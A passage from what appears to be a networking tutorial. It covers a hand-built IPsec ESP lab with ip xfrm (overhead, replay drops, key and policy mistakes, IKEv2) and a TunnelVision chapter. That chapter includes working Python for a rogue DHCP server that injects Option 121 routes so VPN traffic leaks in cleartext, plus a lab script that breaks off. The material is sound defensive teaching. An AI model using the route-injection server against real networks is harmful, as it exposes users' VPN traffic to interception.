== 2. ESP tunnel up: same ping, now encrypted

   2 sent, 2 replies (172.16.1.1 -> 172.16.2.1, 56-byte payload)
-- right: ip -s xfrm state (inbound SA)
   src 10.0.0.1 dst 10.0.0.2
    proto esp spi 0x00001001(4097) reqid 1(0x00000001) mode tunnel
    replay-window 32 seq 0x00000000 flag  (0x00000000)
    aead rfc4106(gcm(aes)) 0x1111111111111111111111111111111111111111 (160 bits) 128
    lastused 2026-11-13 09:24:34
    anti-replay context: seq 0x2, oseq 0x0, bitmap 0x00000003

    lifetime current:
      168(bytes), 2(packets)
      add 2026-11-13 09:24:34 use 2026-11-13 09:24:34
    stats:
      replay-window 0 replay 0 failed 0
== 3. overhead: inner 1000-byte ping
   10.0.0.1 > 10.0.0.2    ESP  len=1056  spi=0x00001001 seq=3  payload-head=80edd0062960eea2
 172.16.1.1 > 172.16.2.1  ICMP len=1000  icmp type=8 payload-head=0001020304050607
   1 sent, 1 replies (172.16.1.1 -> 172.16.2.1, 972-byte payload)
== 4. replay a captured ESP packet 3 times
replayed 3 copies of a 154-byte frame on wan-l
   right XfrmInStateSeqError 3
== 5. wrong key on right's inbound SA
-- after 'state update' with the bad key, the SA still holds:
   aead rfc4106(gcm(aes)) 0x1111111111111111111111111111111111111111 128
   2 sent, 2 replies (172.16.1.1 -> 172.16.2.1, 56-byte payload)
-- delete + add with the bad key instead
   2 sent, 0 replies (172.16.1.1 -> 172.16.2.1, 56-byte payload)

-- good key restored
   2 sent, 2 replies (172.16.1.1 -> 172.16.2.1, 56-byte payload)
== 6. left 'forgets' its out policy: plaintext reaches right

   1 sent, 0 replies (172.16.1.1 -> 172.16.2.1, 56-byte payload)
   right XfrmInTmplMismatch 1
-- right without an 'in' policy
   2 sent, 2 replies (172.16.1.1 -> 172.16.2.1, 56-byte payload)

Reading section 1 and 2: the inner packet disappears
Without IPsec, the capture on wan-r shows the ICMP echo as it is: 172.16.1.1 > 172.16.2.1, 84 bytes, and the payload bytes 00 01 02 ... that ping.py put there.
With the SAs and policies in place, the same ping produces a different packet on the “Internet” link: 10.0.0.1 > 10.0.0.2, protocol ESP, 140 bytes, SPI 0x00001001. The inner addresses and payload are no longer visible. The 8 bytes after the sequence number are the IV. Only the last byte changes between packets, because seqiv mixes the sequence number into a fixed per-SA value.
The capture also shows the decrypted inner ICMP after each ESP packet. That is not a leak. After the kernel decrypts an ESP packet, it re-injects the inner packet as if it had arrived on the same interface, and AF_PACKET sockets (and tcpdump) see it a second time. On a real gateway this confuses people every week: “tcpdump shows plaintext on the WAN!” Capture on the sender side, or on a box in the middle, to see what the wire actually carries.
ip -s xfrm state on the receiving SA shows anti-replay context: seq 0x2 ... bitmap 0x00000003: the highest sequence number seen is 2, and the two lowest bits of the window are set because packets 1 and 2 arrived. lifetime current: 168(bytes), 2(packets) is the inner traffic, two 84-byte packets.


Reading section 3: where the overhead comes from
The inner ping is 1000 bytes (20 IP + 8 ICMP + 972 payload). The ESP packet is 1056 bytes. The arithmetic:



Piece
Bytes
Running total




inner IP packet
1000
1000


pad-length + next-header
2
1002


padding to a 4-byte boundary
2
1004


ICV (GCM tag)
16
1020


IV
8
1028


SPI + sequence number
8
1036


outer IPv4 header
20
1056



The 84-byte ping from section 2 checks out the same way: 84 + 2 = 86, pad to 88, + 16 + 8 + 8 + 20 = 140. The fixed part is 52 bytes (20 + 8 + 8 + 16), and the trailer adds 2 to 5 more, so the overhead is 54 to 57 bytes depending on the inner length. On a 1500-byte path the encrypted part can be at most 1448 bytes, so the largest inner IPv4 packet that fits is 1446 bytes. If you add NAT traversal (below), you add 8 bytes of UDP header on top. With a CBC cipher plus a separate HMAC, the IV and tag sizes change. Always measure your own combination, the same way the WireGuard MTU chapter does for WireGuard.


Reading section 4: replay protection is real
inject.py re-sent the first ESP frame captured in section 2, unchanged, three times. The packet has a valid SPI and a valid ICV, because it is a genuine packet. The receiver still dropped all three copies, and XfrmInStateSeqError 3 counted them. Sequence number 1 is already marked in the window. Without anti-replay protection, an attacker who recorded your traffic could replay a “delete” or a “transfer” command packet. The window (replay-window 32 here) also lets packets arrive somewhat out of order without being dropped. On a high-rate link with reordering, a window that is too small shows up as the same counter climbing. Modern stacks use much larger windows for that reason.


Reading section 5: a wrong key fails silently, and update does not change keys
The first attempt used ip xfrm state update to put a bad key on the right side. It “worked”, exited 0, and the SA still printed the old key. Pings kept succeeding. The kernel’s update operation changes things like lifetimes and encapsulation, not the key material. To change a key you delete the SA and add a new one. That is also how IKE rekeys: it installs a new SA with a new SPI and then deletes the old one.
With the bad key really installed, pings failed with no error anywhere visible to the sender. The receiver counted XfrmInStateProtoError 2: the ICV check failed, so ESP rejected the packets. When “the tunnel is up but nothing passes”, read this file on the receiver before anything else:
watch -n1 "grep -v ' 0$' /proc/net/xfrm_stat"
(not run here as a watch loop; the lab reads the same file once per step.)







Counter
Usually means




XfrmInNoStates
ESP arrived for an SPI this host has no SA for (rekey race, peer rebooted, wrong peer)


XfrmInStateProtoError
ICV or decryption failed: key mismatch, corruption, wrong algorithm


XfrmInStateSeqError
replay or reordering beyond the window


XfrmInTmplMismatch
a packet matched an in/fwd policy but did not arrive through the required SA, often plaintext


XfrmOutNoStates
an out policy matched but no SA exists yet (IKE has not finished, or has failed)


XfrmInStateExpired / XfrmOutStateExpired
traffic hit an SA past its lifetime, usually a rekey problem





Reading section 6: the in policy is your firewall
Left deleted its out policy, so the next ping left in clear. The capture shows plaintext ICMP on the wire. Right dropped it and counted XfrmInTmplMismatch 1. Right’s in policy says traffic from 172.16.1.0/24 must arrive through ESP, and this packet did not.
Then right also deleted its in policy, and the plaintext pings were answered. Without an in (or fwd) policy, the kernel accepts unprotected packets from the “protected” prefix. Anyone on the path who can forge a source address in 172.16.1.0/24 can then talk to right without a key. An IPsec configuration that only has out policies encrypts traffic in one direction and protects nothing in the other. strongSwan installs matching in and fwd policies for every CHILD_SA. Hand-built or vendor-translated configurations sometimes do not.

title: IPsec by Hand: ESP with ip xfrm, and What IKEv2 Automates
text:
What IKEv2 automates
IKEv2 (RFC 7296) runs over UDP 500, or UDP 4500 once NAT is detected. One IKE SA protects the control channel, and one or more CHILD_SAs are the ESP SA pairs you just built by hand.
Initiator                                              Responder
IKE_SA_INIT  --  SA proposals, KE (e.g. X25519), nonces, NAT-D  -->
             <--  chosen proposal, KE, nonces, NAT-D, [cookie]    --
   (both sides now derive IKE keys; everything below is encrypted)
[IKE_INTERMEDIATE  --  additional key exchanges (RFC 9242/9370)  -->]
IKE_AUTH     --  IDs, AUTH (certificate / PSK / EAP), first CHILD_SA proposal, traffic selectors  -->
             <--  IDs, AUTH, chosen CHILD_SA, narrowed traffic selectors  --
   (both sides install SPD policies and SAD states: what lab.sh did by hand)
CREATE_CHILD_SA  -- later: new CHILD_SAs, rekeying, IKE SA rekey -->
INFORMATIONAL    -- delete SAs, dead peer detection (liveness)  -->
Mapped onto the lab:







Lab step
IKEv2 piece




choosing rfc4106(gcm(aes))
proposal negotiation in IKE_SA_INIT / IKE_AUTH


K_LR, K_RL
derived from the Diffie-Hellman (or KEM) shared secret and nonces, fresh per CHILD_SA


SPI 0x1001 / 0x2001
each side picks the SPI it wants to receive on


ip xfrm policy ... 172.16.1.0/24 172.16.2.0/24
traffic selectors (TSi/TSr), which the responder may narrow


delete + add the SA
rekeying with CREATE_CHILD_SA before lifetime expiry, then INFORMATIONAL delete


nothing
peer authentication. The lab trusts whoever knows the key; IKE proves identity with certificates, PSK or EAP




NAT traversal
ESP is IP protocol 50 and has no ports, so a NAT that rewrites ports cannot handle it. IKEv2 detects NAT in IKE_SA_INIT (NAT_DETECTION payloads carry hashes of the addresses and ports). If NAT is detected, both sides move to UDP 4500 and wrap ESP in UDP (RFC 3948). That costs another 8 bytes of overhead and needs NAT keepalives, the same mapping-lifetime problem as in the NAT traversal chapter. In ip xfrm terms the SA gains encap espinudp 4500 4500 0.0.0.0.


A strongSwan configuration, for comparison
(not run here; written from the strongSwan swanctl documentation. strongSwan is not installed on the lab box.)
connections {
  site-a-b {
    version = 2
    local_addrs  = 10.0.0.1
    remote_addrs = 10.0.0.2
    proposals = aes256gcm16-prfsha384-x25519-ke1_mlkem768
    local {
      auth = pubkey
      certs = left.crt
      id = left.example.net
    }
    remote {
      auth = pubkey
      id = right.example.net
    }
    children {
      lan-lan {
        local_ts  = 172.16.1.0/24
        remote_ts = 172.16.2.0/24
        esp_proposals = aes128gcm16-x25519-ke1_mlkem768
        start_action = trap
        dpd_action = restart
      }
    }
  }
}
swanctl --list-sas then shows the IKE SA and the CHILD_SA. ip xfrm state and ip xfrm policy show the rows strongSwan installed: the same shape as the lab, with real SPIs, real keys and lifetimes. start_action = trap installs the policies first and negotiates on the first matching packet. That is the “acquire” path, and before IKE finishes it shows up as XfrmOutNoStates.


Post-quantum key exchange
A recorded IKE exchange protected only by ECDH could be decrypted later by a large enough quantum computer (“harvest now, decrypt later”). RFC 9370 lets IKEv2 run up to seven additional key exchanges after the first one, in IKE_INTERMEDIATE messages (RFC 9242). All the shared secrets are mixed into the keys. A hybrid proposal such as x25519-ke1_mlkem768 therefore stays secure if either X25519 or ML-KEM-768 holds. strongSwan 6.0 and later supports this syntax.
The ML-KEM-in-IKEv2 specification (draft-ietf-ipsecme-ikev2-mlkem, approved by the IESG and in the RFC Editor queue as of this writing) points out the operational catch. ML-KEM-768 and ML-KEM-1024 keys can push IKE_SA_INIT past typical path MTUs, and IKE_SA_INIT cannot use IKEv2 fragmentation (RFC 7383). Put the post-quantum KEM in an additional exchange (ke1_), where IKE_INTERMEDIATE messages can be fragmented. Do not make it the only key exchange in IKE_SA_INIT on paths you have not measured.

title: IPsec by Hand: ESP with ip xfrm, and What IKEv2 Automates
text:
Case
This is an illustrative scenario, not a real named incident.
A branch tunnel had run for months. One morning, the branch could reach the data centre but every reply from the data centre timed out. Both sides showed the IKE SA as established. On the data-centre gateway, ip xfrm state showed two inbound SAs for the branch, one with a large byte count and one, newer, with almost none. On the branch, /proc/net/xfrm_stat showed XfrmInNoStates climbing. The data centre had rekeyed the CHILD_SA and deleted the old one, but the branch had missed the INFORMATIONAL exchange during a short WAN flap. The data centre was now sending on an SPI the branch did not know. swanctl --rekey --child lan-lan from the branch fixed it immediately. The lasting fix was enabling dead peer detection with dpd_action = restart and alerting on any non-zero XfrmInNoStates rate.

title: IPsec by Hand: ESP with ip xfrm, and What IKEv2 Automates
text:
Trap
Trusting tcpdump on the receiving gateway. As section 2 showed, the decrypted inner packets appear on the same interface right after the ESP packets. People see plaintext and conclude “the tunnel isn’t encrypting”, or they see ICMP and conclude ESP is being bypassed. Capture on the sending side or in the middle. Confirm with the counters: lifetime current bytes on the SA should grow with your traffic.
The second trap is MTU. 54 to 57 bytes of ESP overhead, plus 8 for NAT-T, means a 1500-byte inner packet with DF set cannot cross a 1500-byte path. If ICMP “fragmentation needed” is filtered anywhere, large TCP transfers hang while ping works. Clamp TCP MSS on the tunnel, or set the tunnel interface MTU, and test with large packets as part of turn-up.

title: IPsec by Hand: ESP with ip xfrm, and What IKEv2 Automates
text:
Boring rule
For every protected prefix pair, check four things: an out policy, an in policy (plus fwd on a gateway), an SA in each direction, and zero-rate error counters in /proc/net/xfrm_stat. Use IKEv2 with certificates, never static keys. Make the post-quantum KEM an additional key exchange, not the first one.

title: IPsec by Hand: ESP with ip xfrm, and What IKEv2 Automates
text:
Try this

Change mode tunnel to mode transport in both the SAs and the policies, and change the selectors to the 10.0.0.x addresses. Ping 10.0.0.2 and compare the captured length with section 2. Which 20 bytes went away?
Replace AES-GCM with enc 'cbc(aes)' 0x<16 bytes> auth-trunc 'hmac(sha256)' 0x<32 bytes> 128. Re-run section 3 and redo the overhead table. Why are the IV and padding different?
Shrink replay-window to 0 and repeat section 4. What happens to the replayed frames now? Then set it to 32 and inject the frames in reverse order.
Add encap espinudp 4500 4500 0.0.0.0 to both SAs on both sides and re-run the sniffer. Extend sniff.py so it decodes the UDP header and the SPI behind it.
Rebuild the lab route-based: create ip link add ipsec0 type xfrm dev wan-l if_id 7 on each side, add if_id 7 to the SAs and policies, change the policy selectors to 0.0.0.0/0, and route 172.16.2.0/24 into ipsec0. (If the kernel refuses the xfrm link type, note it, as with any kernel feature that is not built in.)

title: DHCP Option 121 and VPN Route Leaks (TunnelVision)
text:
DHCP Option 121 and VPN Route Leaks (TunnelVision)
Dynamic Host Configuration Protocol (DHCP) options allow local network administrators to push routing decisions directly into a client system routing table. RFC 3442 defines Option 121, known as Classless Static Routes. Unlike the traditional default gateway supplied by Option 3 (RFC 2132), Option 121 permits a DHCP server to advertise arbitrary IP prefixes along with explicit gateway addresses. Standard client implementations automatically parse these routes and install them directly into the primary kernel routing table upon lease acquisition or renewal.
This routing behavior interacts dangerously with Virtual Private Network (VPN) software that relies on standard routing table entries to secure internet traffic. When a client joins an untrusted local area network (LAN), a rogue DHCP server can push static routes that are more specific than the routes created by the VPN tunnel software. Because Linux kernel destination lookups strictly follow longest-prefix matching, packets destined for internet targets match the more specific local routes and bypass the virtual network interface completely, egressing in unencrypted cleartext across the physical local gateway.
The security implications of this interaction were disclosed as CVE-2024-3661, commonly referred to as TunnelVision. Because the underlying physical interface route table is manipulated without disabling the virtual tunnel interface, the VPN control channel remains fully established and active. Consequently, client-side kill switches that monitor tunnel interface state or tunnel daemon connectivity fail to detect the leakage. Mitigating this issue requires active client policy configuration, route table isolation, or strict network namespace segmentation.

title: DHCP Option 121 and VPN Route Leaks (TunnelVision)
text:
Learning goals

Understand the wire encoding and parsing specifications for RFC 3442 DHCP Option 121 Classless Static Routes.
Analyze how longest-prefix matching in the Linux kernel routing table leads to VPN traffic bypass when more-specific routes are injected via DHCP.
Evaluate the mechanics of CVE-2024-3661 (TunnelVision) and understand why conventional software kill switches fail to prevent cleartext leakage.
Analyze how wg-quick policy routing rules (suppress_prefixlength 0) interact with main table routes and permit Option 121 leaks.
Compare client-side mitigations including route ignoring, policy rule restructuring, and network namespace separation.

title: DHCP Option 121 and VPN Route Leaks (TunnelVision)
text:
Version note
The concepts and practical demonstrations in this chapter were verified on Linux 6.12 using iproute2 version 6.15.0 and Python 3.13 standard library modules. All tests were executed inside unprivileged unshare -urnm namespaces without external system packages.
In the lab demonstration, a virtual ethernet pair named vpn0 is used as a standard interface stand-in for virtual tunnel devices such as wg0 or tun0. Kernel route lookups, longest-prefix matching, policy routing evaluations, and interface selection behavior are identical in the kernel regardless of whether the destination interface is a physical NIC, a virtual ethernet device, or a TUN/TAP/WireGuard interface.

title: DHCP Option 121 and VPN Route Leaks (TunnelVision)
text:
Option 121 Encoding and RFC 3442 Rules
RFC 3442 defines a variable-length format for encoding classless static routes in DHCPv4 Option 121. Before RFC 3442, Option 33 (RFC 2132) carried static routes with no mask at all: the destination’s class implied it, and a default route was not allowed. Option 121 removes classful restrictions by preceding each destination prefix with a single octet specifying the subnet mask width (0 to 32 bits).
To save space in the DHCP packet, only the significant octets of the destination subnet prefix are transmitted. The number of octets present for the prefix is calculated as ceil(mask_width / 8) or (mask_width + 7) // 8. The prefix bytes are immediately followed by the 4-byte IPv4 address of the router gateway.








Prefix length (bits)
Significant octets sent
Bytes per route (width + octets + router)




0
0
5


1 to 8
1
6


9 to 16
2
7


17 to 24
3
8


25 to 32
4
9



So four /2 routes cost 24 bytes of option payload, well inside one DHCP message. The lab’s vectors.py reproduces the RFC’s example table exactly.
RFC 3442 mandates strict precedence rules regarding default gateways. If a DHCP server includes both Option 121 and Option 3 (Router) in its response, the client MUST ignore Option 3 and process only Option 121. Section 7 of the RFC therefore tells server administrators to send both options and to repeat the default route inside Option 121; a server that sends Option 121 without 0.0.0.0/0 leaves compliant clients with no default route. Older Microsoft clients used the private Option 249 with the same encoding; dhcpcd still defines it as ms_classless_static_routes.
Crucially, the router gateway specified in an Option 121 entry does not explicitly specify an egress network interface. The DHCP client installs the route using the specific physical interface over which the lease was acquired.

title: DHCP Option 121 and VPN Route Leaks (TunnelVision)
text:
CVE-2024-3661 (TunnelVision) Mechanics
CVE-2024-3661, published by Leviathan Security (Lizzie Moratti and Dani Cronce) on May 6, 2024, highlights how Option 121 can be exploited by an attacker sharing a local network segment with a target device.
When a standard full-tunnel VPN client connects, it attempts to route all non-local internet traffic through its encrypted tunnel. Historically, VPN clients accomplished this by overriding the default route using one of two methods: 1. Replacing the default (0.0.0.0/0) route in the main table with an entry pointing to the tunnel interface. 2. Adding two /1 routes (0.0.0.0/1 and 128.0.0.0/1) pointing to the tunnel interface. Because a /1 prefix is more specific than the /0 default route supplied by a local network router, all internet traffic matches the /1 routes and enters the tunnel.
An attacker operating a rogue DHCP server (or executing ARP spoofing / DHCP starvation on the local network) can respond to client lease requests or trigger short-lease renewals by sending Option 121 static routes. For instance, the attacker can push four /2 routes (0.0.0.0/2, 64.0.0.0/2, 128.0.0.0/2, 192.0.0.0/2) or multiple finer subnets pointing to the local physical gateway.
Traditional Default Route:    0.0.0.0/0             (Prefix length 0)
VPN Override Routes:          0.0.0.0/1, 128.0.0.0/1 (Prefix length 1)
Rogue Option 121 Routes:      0.0.0.0/2, 64.0.0.0/2... (Prefix length 2 - WINS)
Because /2 is more specific than /1, the Linux kernel routing decision forwards matching cleartext traffic directly out of the physical interface toward the local attacker-controlled gateway.
Because the VPN daemon’s control channel to its remote server remains established across the physical network, the VPN software observes a healthy, connected state. Software kill switches that rely on monitoring the VPN adapter’s link state or connection status remain inactive, allowing cleartext data to leak continuously without user notification. Android is notably unaffected by TunnelVision because its network management framework does not implement DHCP Option 121 processing.
Attempts to mitigate TunnelVision purely via client firewall rules (e.g., dropping all non-VPN egress traffic on the physical interface) prevent data contents from leaking, but convert the vector into a selective denial-of-service side channel. An attacker can selectively inject routes to block traffic to specific destination IPs while observing which connections fail, enabling traffic analysis and censorship.
Earlier related research includes TunnelCrack (USENIX Security 2023, Xue et al.), which demonstrated LocalNet and ServerIP attacks against VPN clients by exploiting local route exemptions and spoofed DNS responses.

title: DHCP Option 121 and VPN Route Leaks (TunnelVision)
text:
Policy Routing and wg-quick suppress_prefixlength
Modern WireGuard deployment utilities such as wg-quick use Linux Policy Routing (FIB rules) rather than modifying /1 routes in the main routing table. When establishing a full tunnel, wg-quick creates a separate routing table (typically table 51820) containing a default route pointing into the WireGuard interface. It then configures two routing rules in the kernel database:
32764:  from all lookup main suppress_prefixlength 0
32765:  not from all fwmark 0xca6c lookup 51820
The lookup mechanics operate as follows: 1. Normal outgoing application traffic (unmarked) matches rule 32764 first because rule 32764 has a lower priority number than rule 32765. 2. Rule 32764 queries table main. The suppress_prefixlength 0 argument instructs the kernel to ignore any matching route in main that has a prefix length of 0 (the default route). 3. If table main contains any route with a prefix length greater than 0 (such as a /24 local network or Option 121 /2 routes), that route matches and is used immediately. The lookup terminates, and traffic exits the physical adapter in cleartext. 4. Only if no route with prefix length > 0 matches in main does evaluation fall through to rule 32765, which routes the packet into table 51820 and through the VPN tunnel.
Consequently, wg-quick’s default policy routing strategy remains vulnerable to Option 121 route injection out of the box.

title: DHCP Option 121 and VPN Route Leaks (TunnelVision)
text:
Mitigations and System Configuration
Securing systems against DHCP Option 121 route injection requires explicit configuration changes across network management services or architectural isolation.

Service Configurations (not run here)
To disable Option 121 route ingestion in systemd-networkd, set UseRoutes= to false in the [DHCPv4] section of the relevant .network unit file:
# /etc/systemd/network/20-wired.network (not run here)
[Match]
Name=eth0

[DHCPv4]
UseRoutes=false
UseGateway=true
When UseRoutes=false is set, systemd-networkd ignores Option 121 static routes while preserving default gateway processing from Option 3.
In NetworkManager, disable automatic route installation for a given connection profile:
# (not run here)
nmcli connection modify "Wired connection 1" ipv4.ignore-auto-routes yes
nmcli connection up "Wired connection 1"
For systems utilizing dhcpcd, append the nooption directive to /etc/dhcpcd.conf to ignore classless static routes:
# /etc/dhcpcd.conf (not run here)
nooption classless_static_routes
nooption ms_classless_static_routes


Architectural Defense: Network Namespaces
The most robust client-side mitigation against Option 121 leaks is complete network namespace separation (as recommended by Leviathan Security and the official WireGuard documentation on namespace integration).
Under this model: 1. The physical network interface (eth0) resides in an isolated physical network namespace (e.g., phys), where the DHCP client runs and processes local routes. 2. The WireGuard interface is created inside phys and then moved into the application namespace. WireGuard keeps its UDP socket in the namespace where the interface was created, so encrypted packets still leave through eth0 while the cleartext side of the tunnel lives where the applications are. 3. Applications running in the main namespace only see the virtual VPN interface and have no visibility or access to table main inside the phys namespace. Rogue Option 121 routes injected on the LAN cannot affect routing decisions made by applications in the main namespace.


IPv6 Analogue and Network-Side Defense
The IPv6 counterpart to Option 121 is the Router Advertisement (RA) Route Information Option (RIO), specified in RFC 4191. RIO allows IPv6 routers to advertise specific prefix routes to hosts. In Linux, the kernel sysctl parameter net.ipv6.conf.all.accept_ra_rt_info_max_plen defaults to 0, meaning that only ::/0 default RIOs are accepted by default. If a user increases this parameter to allow specific IPv6 route ingestion, the same class of route leak vulnerability is introduced.
On managed local networks, network-side defenses such as DHCP Snooping on switches must be enabled to drop unauthorized DHCP server responses on untrusted access ports, as demonstrated in the DHCP snooping lab in Part 13.

title: DHCP Option 121 and VPN Route Leaks (TunnelVision)
text:
The lab
The following Python and shell scripts implement a complete DHCP Option 121 parser and builder, a lightweight DHCP server capable of injecting Option 121 routes, a DHCP client enforcing RFC 3442 rules, policy routing verification tools, and isolated network namespace scenarios.


dhcp4.py

# dhcp4.py: just enough DHCPv4 (RFC 2131/2132) and option 121 (RFC 3442) for the lab.
import ipaddress, struct

MAGIC = b"\x63\x82\x53\x63"
DISCOVER, OFFER, REQUEST, ACK = 1, 2, 3, 5

def enc121(routes):
    """routes: [("203.0.113.0/24", "192.168.50.1"), ...] -> option 121 payload."""
    out = b""
    for dst, gw in routes:
        net = ipaddress.IPv4Network(dst)
        sig = (net.prefixlen + 7) // 8          # significant octets, RFC 3442 table
        out += bytes([net.prefixlen]) + net.network_address.packed[:sig]
        out += ipaddress.IPv4Address(gw).packed
    return out

def dec121(data):
    routes, i = [], 0
    while i < len(data):
        plen = data[i]; sig = (plen + 7) // 8
        net = data[i + 1:i + 1 + sig] + b"\0" * (4 - sig)
        gw = data[i + 1 + sig:i + 5 + sig]
        if plen > 32 or len(gw) != 4:
            raise ValueError("malformed option 121")
        routes.append((f"{ipaddress.IPv4Address(net)}/{plen}", str(ipaddress.IPv4Address(gw))))
        i += 5 + sig
    return routes

def build(op, xid, mac, mtype, yiaddr="0.0.0.0", opts=()):
    hdr = struct.pack("!BBBBIHH4s4s4s4s16s64s128s", op, 1, 6, 0, xid, 0, 0x8000,
                      bytes(4), ipaddress.IPv4Address(yiaddr).packed, bytes(4), bytes(4),
                      mac.ljust(16, b"\0"), b"", b"")
    body = bytes([53, 1, mtype])
    for code, val in opts:
        body += bytes([code, len(val)]) + val
    return hdr + MAGIC + body + b"\xff"

def parse(pkt):
    op, xid = pkt[0], struct.unpack("!I", pkt[4:8])[0]
    yiaddr = str(ipaddress.IPv4Address(pkt[16:20])); mac = pkt[28:34]
    opts, i = {}, 240
    while i < len(pkt) and pkt[i] != 255:
        if pkt[i] == 0: i += 1; continue
        code, ln = pkt[i], pkt[i + 1]; opts[code] = pkt[i + 2:i + 2 + ln]; i += 2 + ln
    return op, xid, mac, yiaddr, opts



server.py

# server.py IFACE ROUTES: a one-client DHCP server. ROUTES is "-" (no option 121)
# or a comma list like "203.0.113.0/24@192.168.50.1". It answers until killed.
import socket, sys, ipaddress
from dhcp4 import *
ifc, spec = sys.argv[1], sys.argv[2]
routes = [] if spec == "-" else [tuple(r.split("@")) for r in spec.split(",")]
GW, LEASE = "192.168.50.1", "192.168.50.10"
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, ifc.encode())
s.bind(("0.0.0.0", 67))
while True:
    pkt, _ = s.recvfrom(1500)
    op, xid, mac, _, o = parse(pkt)
    if op != 1 or 53 not in o: continue
    mt = {DISCOVER: OFFER, REQUEST: ACK}.get(o[53][0])
    if mt is None: continue
    opts = [(54, ipaddress.IPv4Address(GW).packed), (51, (600).to_bytes(4, "big")),
            (1, ipaddress.IPv4Address("255.255.255.0").packed),
            (3, ipaddress.IPv4Address(GW).packed)]
    if routes:
        opts.append((121, enc121(routes)))
    s.sendto(build(2, xid, mac, mt, LEASE, opts), ("255.255.255.255", 68))



client.py

# client.py IFACE [--ignore-121]: DISCOVER/OFFER/REQUEST/ACK, then configure
# the interface the way RFC 3442 says (option 121 present -> ignore option 3).
import socket, sys, random, subprocess, ipaddress
from dhcp4 import *
ifc = sys.argv[1]; ignore121 = "--ignore-121" in sys.argv
mac = bytes.fromhex(open(f"/sys/class/net/{ifc}/address").read().strip().replace(":", ""))
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, ifc.encode())
s.bind(("0.0.0.0", 68)); s.settimeout(3)
xid = random.getrandbits(32)
def ask(mtype, extra=()):
    s.sendto(build(1, xid, mac, mtype, opts=extra), ("255.255.255.255", 67))
    while True:
        pkt, _ = s.recvfrom(1500)
        op, rx, _, yi, o = parse(pkt)
        if op == 2 and rx == xid: return yi, o
yi, o = ask(DISCOVER, [(55, bytes([1, 3, 121]))])          # parameter request list
yi, o = ask(REQUEST, [(50, ipaddress.IPv4Address(yi).packed), (54, o[54]), (55, bytes([1, 3, 121]))])
plen = ipaddress.IPv4Network(f"0.0.0.0/{ipaddress.IPv4Address(o[1])}").prefixlen
run = lambda *a: subprocess.run(["ip", *a], check=True)
run("addr", "replace", f"{yi}/{plen}", "dev", ifc)
r121 = dec121(o[121]) if 121 in o else []
print(f"   [dhcp] ACK {yi}/{plen} router(3)={ipaddress.IPv4Address(o[3])} option121={r121 or 'none'}")
if r121 and not ignore121:
    for dst, gw in r121:                      # RFC 3442: option 3 MUST be ignored
        via = [] if gw == "0.0.0.0" else ["via", gw]
        run("route", "replace", dst, *via, "dev", ifc, "proto", "dhcp", "metric", "1024")
else:
    if r121: print("   [dhcp] option 121 ignored by local policy; using option 3")
    run("route", "replace", "default", "via", str(ipaddress.IPv4Address(o[3])),
        "dev", ifc, "proto", "dhcp", "metric", "1024")



sniff.py

# sniff.py IFACE LABEL: print every IPv4/UDP datagram to port 9 seen on IFACE.
import socket, sys, ipaddress
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
s.bind((sys.argv[1], 0))
while True:
    f = s.recv(2048); ip = f[14:]; ihl = (ip[0] & 15) * 4
    if ip[9] != 17 or int.from_bytes(ip[ihl + 2:ihl + 4], "big") != 9: continue
    src, dst = ipaddress.IPv4Address(ip[12:16]), ipaddress.IPv4Address(ip[16:20])
    print(f"      {sys.argv[2]} saw {src} -> {dst}: {ip[ihl + 8:].decode()}", flush=True)



probe.py

# probe.py: one cleartext UDP datagram to each destination, port 9 (discard).
import socket, sys
for dst in sys.argv[1:]:
    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b"session=8f3a", (dst, 9))



lab.sh

#!/bin/sh
# Run as: unshare -urnm sh lab.sh   (unprivileged: user, net and mount namespaces; no sudo)
H=$(pwd); mount -t tmpfs tmpfs /run; mkdir -p /run/netns
for ns in lan vpn client; do ip netns add $ns; ip -n $ns link set lo up; done
ip link add lan0 netns lan type veth peer name eth0 netns client     # the coffee-shop LAN
ip link add v-vpn netns vpn type veth peer name vpn0 netns client    # stand-in for wg0/tun0
ip -n lan addr add 192.168.50.1/24 dev lan0; ip -n vpn addr add 10.13.37.1/24 dev v-vpn
ip -n client addr add 10.13.37.2/24 dev vpn0
for l in "lan lan0" "vpn v-vpn" "client eth0" "client vpn0"; do set -- $l; ip -n $1 link set $2 up; done
C="ip netns exec client"; T1=203.0.113.10; T2=198.51.100.7
ip netns exec lan python3 -u $H/sniff.py lan0 "LAN (attacker)" & S1=$!
ip netns exec vpn python3 -u $H/sniff.py v-vpn "VPN tunnel    " & S2=$!
sleep 0.3
lease() {   # $1 = option 121 spec for the server, rest = client flags
    spec=$1; shift; ip -n client route flush proto dhcp 2>/dev/null
    ip netns exec lan python3 $H/server.py lan0 "$spec" & SV=$!; sleep 0.3
    $C python3 $H/client.py eth0 "$@"; kill $SV; wait $SV 2>/dev/null
}
probe() {
    for d in $T1 $T2; do printf '   route get %-14s -> %s\n' $d "$($C ip route get $d $1 | head -1)"; done
    $C python3 $H/probe.py $T1 $T2; sleep 0.4
}
echo "== 1. honest lease, OpenVPN-style full tunnel (0/1 + 128/1 via vpn0, /32 to the VPN server)"
lease -
$C ip route add 0.0.0.0/1 via 10.13.37.1 dev vpn0
$C ip route add 128.0.0.0/1 via 10.13.37.1 dev vpn0
$C ip route add 192.0.2.1/32 via 192.168.50.1 dev eth0
probe
echo "== 2. rogue renewal: option 121 = 203.0.113.0/24 via the attacker (plus 0/0, since 3 is now ignored)"
lease "203.0.113.0/24@192.168.50.1,0.0.0.0/0@192.168.50.1"

title: DHCP Option 121 and VPN Route Leaks (TunnelVision)
text:
Reading the output

Section 1: Honest Lease and Classic Full Tunnel
In Scenario 1, an initial DHCP lease is acquired without Option 121 (option121=none). The client installs a default route via Option 3. The OpenVPN-style client then configures two /1 routes (0.0.0.0/1 and 128.0.0.0/1) pointing to gateway 10.13.37.1 on vpn0, alongside an explicit /32 endpoint route to the physical gateway for the VPN server IP (192.0.2.1).
